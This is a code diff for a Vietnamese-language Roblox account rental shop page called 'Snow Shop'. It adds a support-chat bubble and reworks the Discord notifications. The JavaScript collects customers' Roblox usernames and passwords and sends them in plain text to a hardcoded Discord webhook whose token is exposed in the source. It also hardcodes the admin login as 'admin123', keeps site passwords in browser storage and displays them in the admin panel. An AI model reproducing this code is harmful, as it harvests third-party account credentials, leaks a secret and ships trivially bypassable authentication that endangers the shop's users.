@@ -20,6 +20,13 @@
         .modal{background:#fff;width:90%;max-width:400px;margin:80px auto;border-radius:16px;padding:20px;position:relative;animation:slideUp 0.3s}
         @keyframes slideUp{from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1}}
         optgroup{font-weight:bold;color:#0f172a}
+
+        /* CSS BONG BÓNG HỖ TRỢ */
+        .support-btn { position: fixed; bottom: 20px; right: 20px; width: 60px; height: 60px; background: #0ea5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 30px; box-shadow: 0 4px 15px rgba(14, 165, 233, 0.4); cursor: pointer; z-index: 999; animation: pulse 2s infinite; }
+        .support-menu { position: fixed; bottom: 90px; right: 20px; display: none; flex-direction: column; gap: 10px; z-index: 999; }
+        .support-item { background: white; padding: 10px 15px; border-radius: 30px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 10px; text-decoration: none; color: #334155; font-weight: bold; font-size: 14px; transition: 0.2s; border: 1px solid #e2e8f0; }
+        .support-item:hover { transform: translateX(-5px); background: #f8fafc; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
@@ -82,7 +89,6 @@
             <button class="tab-btn" onclick="showTab('users', this)">Cấp Tiền</button>
             <button class="tab-btn" onclick="showTab('usersList', this)">Thành viên</button>
         </div>
-
         <div id="tabOrders" class="tab-content"><div id="adminOrderList"></div></div>
         <div id="tabNaps" class="tab-content" style="display:none"><div id="adminNapList"></div></div>
         <div id="tabUsers" class="tab-content" style="display:none">
@@ -98,9 +104,17 @@
     </div>
 </div>
 
+<div class="support-menu" id="supportMenu">
+    <a href="https://m.me/your_id" target="_blank" class="support-item">🔵 Messenger Admin</a>
+    <a href="https://zalo.me/your_phone" target="_blank" class="support-item">🟢 Chat Zalo</a>
+    <a href="https://facebook.com/your_profile" target="_blank" class="support-item">📘 Facebook Cá Nhân</a>
+</div>
+<div class="support-btn" onclick="toggleSupport()">💬</div>
+
 <div id="modalOverlay"><div class="modal" id="modalContent"></div></div>
 
 <script>
+// --- GIỮ NGUYÊN TOÀN BỘ LOGIC JAVASCRIPT CŨ CỦA BẠN ---
 const ADMIN_CONFIG = { user: "admin", pass: "admin123" };
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465766093543964673/QfBdKIbYOgo5_s9S_YaJDF6vg6ZF8RyWwEw06uPZW3YtZuPUjCmODVJfdFmowfH1d9Gm";
 
@@ -120,6 +134,12 @@ const el = {
     adminView: document.getElementById('adminView')
 };
 
+// Hàm mở/đóng bong bóng
+function toggleSupport() {
+    const menu = document.getElementById('supportMenu');
+    menu.style.display = (menu.style.display === 'flex') ? 'none' : 'flex';
+}
+
 window.onload = () => {
     const session = localStorage.getItem('snow_session');
     if(session && db_users[session]) cur = db_users[session];
@@ -138,7 +158,6 @@ function render() {
         el.uBalance.innerText = cur.balance.toLocaleString();
         el.authBtns.style.display = "none"; el.userBtns.style.display = "block";
         el.adminView.style.display = (cur.username === ADMIN_CONFIG.user) ? "block" : "none";
-
         const myOrders = db_orders.filter(o => o.buyer === cur.username);
         el.history.innerHTML = myOrders.length ? myOrders.map(o => `
             <div style="border-bottom:1px solid #f1f5f9; padding:10px 0">
@@ -163,7 +182,6 @@ function renderAdmin() {
             <button onclick="deleteOrder(${i})" class="red" style="font-size:11px">Xoá</button>
         </div>
     `).reverse().join('');
-
     document.getElementById('adminNapList').innerHTML = db_naps.map((n, i) => `
         <div class="box" style="background:#f8fafc">
             <b>${n.username}</b> - nạp ${n.amount.toLocaleString()}đ<br>
@@ -172,7 +190,6 @@ function renderAdmin() {
             <button onclick="deleteNap(${i})" class="red">Xoá</button>
         </div>
     `).reverse().join('');
-
     document.getElementById('adminMemberList').innerHTML = Object.values(db_users).map(user => `
         <div class="box" style="background:#f8fafc; border:1px solid #e2e8f0; margin:5px 0">
             <b>User:</b> ${user.username} | <b>Pass:</b> ${user.password}<br>
@@ -187,21 +204,16 @@ function handleBuy() {
     const acc = document.getElementById('accRoblox').value.trim();
     const pass = document.getElementById('passRoblox').value.trim();
     if(!góiVal || !acc || !pass) return alert("Vui lòng nhập đủ thông tin!");
-    
     const [name, price] = góiVal.split('|');
     if(cur.balance < parseInt(price)) return alert("Số dư không đủ!");
-
     cur.balance -= parseInt(price);
     db_users[cur.username] = cur;
     db_orders.push({ buyer: cur.username, goi: name, acc, pass, status: "Chờ duyệt", time: new Date().toLocaleString() });
-    
     save(); render();
     alert("Đặt đơn thành công!");
-
-    // Thông báo Discord chi tiết
-    sendWebhook("🛒 CÓ ĐƠN THUÊ MỚI!", 
-        `**Khách hàng:** ${cur.username}\n**Gói:** ${name}\n**Giá:** ${parseInt(price).toLocaleString()}đ\n**TK Roblox:** \`${acc}\`\n**MK Roblox:** \`${pass}\``, 
-        3447003
+    sendWebhook("❄️ ĐƠN THUÊ MỚI — SNOW SHOP", 
+        `**👤 Khách:** \`${cur.username}\`\n**📦 Gói:** \`${name}\`\n**💰 Giá:** \`${parseInt(price).toLocaleString()}đ\`\n**💳 TK:** \`${acc}\`\n**🔑 MK:** \`${pass}\`\n**💸 Số dư:** \`${cur.balance.toLocaleString()}đ\``, 
+        2067276
     );
 }
 
@@ -211,7 +223,7 @@ function approveNap(i) {
         db_users[req.username].balance += req.amount;
         db_naps[i].status = "Đã duyệt";
         save(); render();
-        alert(`Đã cộng ${req.amount.toLocaleString()}đ cho ${req.username}`);
+        alert(`Đã cộng tiền cho ${req.username}`);
     }
 }
 
@@ -230,7 +242,10 @@ function submitNap() {
     db_naps.push({ username: cur.username, amount: amt, status: "Chờ duyệt", time: new Date().toLocaleString() });
     save(); closeModal(); render();
     alert("Đã gửi yêu cầu nạp!");
-    sendWebhook("💰 YÊU CẦU NẠP", `Khách: ${cur.username}\nSố tiền: ${amt.toLocaleString()}đ`, 15105570);
+    sendWebhook("💰 YÊU CẦU NẠP TIỀN — SNOW SHOP", 
+        `**👤 Khách:** \`${cur.username}\`\n**💵 Số tiền:** \`${amt.toLocaleString()}đ\`\n**📝 Nội dung:** \`NAP ${cur.username}\``, 
+        15844367
+    );
 }
 
 function adminAddMoney() {
